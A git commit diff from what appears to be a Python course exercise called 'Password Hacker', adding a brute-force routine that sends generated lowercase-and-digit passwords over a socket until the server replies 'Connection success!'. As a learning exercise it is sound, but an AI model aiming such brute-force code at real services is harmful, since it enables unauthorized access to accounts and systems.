135d92db1c4405636cf0f29842b0e4bbc67aa2fd
roblebob <robert.koppisch@gmail.com>
2024-01-23 17:53:40 +0100

    finished 2/5

--- Password Hacker with Python/task/hacking/hack.py
+++ Password Hacker with Python/task/hacking/hack.py
@@ -1,21 +1,40 @@
 # write your code here
 import sys
 import socket
+import string
+import itertools
 
 BUFFER_SIZE = 1024
+MAX_NUM_PASSWORDS = 1_000_000
 
 
-def make_connection(ip, port, msg):
+def generate_password(MAX):
+    chars = list(string.ascii_lowercase + string.digits)
+    length = 1
+    counter = 0
+    while counter < MAX:
+        passwords = list(map(lambda s: ''.join(s), itertools.product(chars, repeat=length)))
+        length += 1
+        for password in passwords:
+            yield password
+            counter += 1
+            if counter == MAX:
+                break
+
+
+def make_connection(ip, port):
     with socket.socket() as client_socket:
         client_socket.connect((ip, port))
-        client_socket.send(msg.encode())
-        response = client_socket.recv(BUFFER_SIZE).decode()
+        for password in generate_password(MAX_NUM_PASSWORDS):
+            client_socket.send(password.encode())
+            response = client_socket.recv(BUFFER_SIZE).decode()
+            if response == "Connection success!":
+                return password
 
-    return response
+    return None
 
 
 if __name__ == '__main__':
     ip = sys.argv[1]
     port = int(sys.argv[2])
-    msg = sys.argv[3]
-    print(make_connection(ip, port, msg))
+    print(make_connection(ip, port))
